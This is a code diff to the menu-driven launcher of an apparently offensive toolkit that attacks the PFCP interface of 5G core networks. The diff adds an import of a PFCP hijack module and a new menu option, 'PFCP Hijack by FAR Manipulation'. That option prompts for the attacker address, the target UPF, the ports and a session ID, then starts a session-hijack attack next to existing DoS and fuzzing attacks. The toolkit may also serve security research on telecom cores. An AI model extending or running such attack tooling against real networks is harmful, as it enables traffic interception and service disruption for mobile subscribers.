@@ -1,5 +1,6 @@
 from pfcpDosAttack import PFCPDosAttack
 from pfcpFuzzer import PFCPFuzzer
+from pfcpHijack import PFCPHijack
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
 SPOOFED_SMF_ADDR = "10.100.200.8"
@@ -61,6 +62,9 @@ def main():
     print("\n==== PFCP Discovery Attacks ====")
     print("[6]  PFCP SEID Fuzzing")
     print("[7]  PFCP FAR Fuzzing")
+    
+    print("\n==== PFCP Hijack Attacks ====")
+    print("[8]  PFCP Hijack by FAR Manipulation")
     
     usr_input = input("# ")
     choice = None
@@ -168,7 +172,7 @@ def main():
         print("Enter the Session range: ")
         session_range = int(input("# "))
         
-        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
+        dos_obj = PFCPDosAttack(verbose=True)
         dos_obj.Start_pfcp_session_modification_far_dupl_bruteforce(
             far_range=far_range, 
             session_range=session_range,
@@ -231,6 +235,30 @@ def main():
             max_far_discover=max_far_discover,
             src_port=src_port,
             dest_port=dest_port
+        )
+    if choice == 8:
+        print("PFCP Hijack by FAR Manipulation selected")
+        
+        print(f"Enter your IP address (hijacker_addr) [default: {EVIL_ADDR}]: ")
+        hijacker_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("SEID to fuzz: ")
+        seid = int(input("# "))
+        
+        hijack_obj = PFCPHijack()
+        hijack_obj.set_verbose(True)
+        hijack_obj.Start_PFCP_hijack_far_manipulation(
+            hijacker_addr=hijacker_addr,
+            upf_addr=upf_addr,
+            src_port=src_port,
+            dest_port=dest_port,
+            seid=seid
         )
 
 
